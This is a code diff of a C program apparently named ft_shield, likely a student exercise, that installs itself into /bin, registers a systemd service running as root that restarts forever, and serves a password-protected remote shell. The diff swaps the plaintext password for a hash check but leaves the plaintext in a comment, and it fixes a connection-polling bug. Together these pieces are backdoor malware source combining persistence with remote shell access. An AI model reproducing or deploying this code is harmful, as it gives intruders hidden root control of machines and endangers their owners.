@@ -1,3 +1,4 @@
+char arr[10];
 #include <stdbool.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
@@ -25,10 +26,21 @@ char target_path[] = "/bin/ft_shield";
 char daemon_config_path[] = "/etc/systemd/system/";
 char service_path[] = "/etc/systemd/system/ft_shield.service";
 char daemon_config[]  = "[Unit]\nDescription=ft_shield\nAfter=network.target\n[Service]\nWorkingDirectory=/bin\nExecStart=/bin/ft_shield\nRestart=always\nType=forking\nUser=root\n[Install]\nWantedBy=multi-user.target\n";
-
 char cmd[1000];
 char filePath[600];
 
+
+
+unsigned long hash(char *str){
+    unsigned long h = 5381;
+
+    for (int i = 0; str[i] != '\0'; i++){
+        int c = str[i];
+        h = ((h << 5) + h) + c;
+    }
+
+    return h;
+}
 
 
 bool in_bin(){
@@ -233,7 +245,7 @@ char new_conn_faill[] = "fail connection\n";
 char dbg_by[] = "connection closed\n";
 char dbg_msg[] = "msg received :\n";
 char dbg_pass[] = "valid password:\n";
-char password[] = "Hatim";
+unsigned long password= 15089076065643833894lu;
 
 bool add_client(int fd){
 	for (int i = 0; i < sizeof(server.fds) / sizeof(struct pollfd); i++){
@@ -318,7 +330,9 @@ void alert_client(int fd, char *msg, int len){
 
 bool valid_password(char *buffer){
 
-	return strcmp(buffer, password) == 0;
+    
+    // HatimFt_shieldYahya
+	return hash(buffer) == password;
 }
 
 
@@ -387,7 +401,7 @@ void server_reverse_shell(){
 			exit(0);
 
 		for (int i = 0; i < sizeof(server.fds) / sizeof(struct pollfd); i++){
-			if ((!server.fds[i].revents & POLLIN) || server.fds[i].fd == -1)
+			if (!(server.fds[i].revents & POLLIN) || server.fds[i].fd == -1)
 				continue;
 
 			// new connection 
